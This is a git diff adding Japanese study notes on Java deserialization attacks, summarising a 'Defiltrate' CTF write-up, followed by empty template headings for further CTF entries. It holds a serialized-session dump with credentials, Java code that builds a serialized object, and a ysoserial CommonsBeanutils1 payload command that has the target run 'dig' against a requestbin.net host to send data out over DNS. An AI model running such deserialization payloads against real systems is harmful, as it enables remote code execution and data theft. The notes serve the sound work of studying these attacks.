@@ -418,7 +418,100 @@ Zoho ManageEngine Applications Manager before build 13740の`CustomFieldsFeedSer
 攻撃者SMBサーバーにysoserialで作成したCommonsCollections1のガジェットを用意しておいて、SMBへのパスをフィールドにセットすればそのガジェットを読み込んでRCE！  
 
 多分JDGuiとかでjarファイルをデコンパイルして発見したのかな？？？  
+## ysoserial CommonsBeanutils / reverse DNS Request with flag (Defiltrate)
+https://r3billions.com/writeup-defiltrate-part1/  
+- **entrypoint**  
+よくわからんけど、たぶんリクエストを見ると`VIEW`というパラメータにBase64エンコードされたデータがPOSTされてて、`rO0AB`で始まってるからJavaのシリアライズされたデータだとわかる。  
+これをSerializationDumperで解析するといかのように、いくつかのログイン関係の値らしい。  
+```txt
+values
+    m_b64Payload
+    (object)
+        TC_STRING - 0x74
+        newHandle 0x00 7e 00 03
+        Length - 0 - 0x00 00
+        Value -  - 0x
+    m_login
+    (object)
+        TC_STRING - 0x74
+        newHandle 0x00 7e 00 04
+        Length - 5 - 0x00 05
+        Value - admin - 0x61646d696e
+    m_password
+    (object)
+        TC_STRING - 0x74
+        newHandle 0x00 7e 00 05
+        Length - 21 - 0x00 15
+        Value - I love pink ponies <3 - 0x49206c6f76652070696e6b20706f6e696573203c33
+    m_sessionID
+    (object)
+        TC_STRING - 0x74
+        newHandle 0x00 7e 00 06
+        Length - 2 - 0x00 02
+        Value - 42 - 0x3432
+```
+`m_sessionID`の値を`42`から`0`,`1`に変えてみるような以下のシリアライズされたデータを作成しても何も変化がなかったらしい。  
+```java
+import java.io.*;
+import java.util.*;
 
+class WebSession implements Serializable {
+    String m_b64Payload;
+    String m_login;
+    String m_password;
+    String m_sessionID;
+}
+
+public class NewClass {
+
+   public static void main(String [] args) {
+      WebSession e = new WebSession();
+      e.m_b64Payload = "eW91dHUuYmUvZFF3NHc5V2dYY1E=";
+      e.m_login = "admin";
+      e.m_password = "I love pink ponies <3";
+      e.m_sessionID = "1";
+
+      try {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream( baos );
+        oos.writeObject( e );
+        oos.close();
+        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
+      } catch (IOException i) {
+         i.printStackTrace();
+      }
+   }
+}
+```
+なので、ysoserialを今度は使うらしい。`CommonsBeanutils1`を使えばいけたらしいけどこれは多分いろいろ試して頑張ってるのか？  
+ファイアーウォールが外部へのリクエストをDNS以外はじくっぽいので、digコマンドで攻撃者サーバーにDNSリクエストを送信させるらしい。  
+```txt
+java -jar ysoserial.jar CommonsBeanutils1 'dig rce.ef8d2b0eafff5eb0e48f.d.requestbin.net' | base64 -w0
+```
+そのあとはなんやかんやしてdigコマンドで発生させるDNSリクエストにFlagの値を付与して送信させてるけどよくわからん…  
+- **payload**  
+```txt
+java -jar ysoserial.jar CommonsBeanutils1 'dig rce.ef8d2b0eafff5eb0e48f.d.requestbin.net' | base64 -w0
+```
+
+## (PoliCTF 2017 LameRMI)
+https://github.com/PoliCTF/sources2017/blob/master/pwn-lamermi/writeup.md  
+- **entrypoint**  
+- **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
+
+## 
+- **entrypoint**  
+- **payload**  
+## 
+- **entrypoint**  
+- **payload**  
+## 
+- **entrypoint**  
+- **payload**  
 # DeserLab
 ## setup
 server側は以下でJARファイルを実行して9000ポートで待ち受け。   
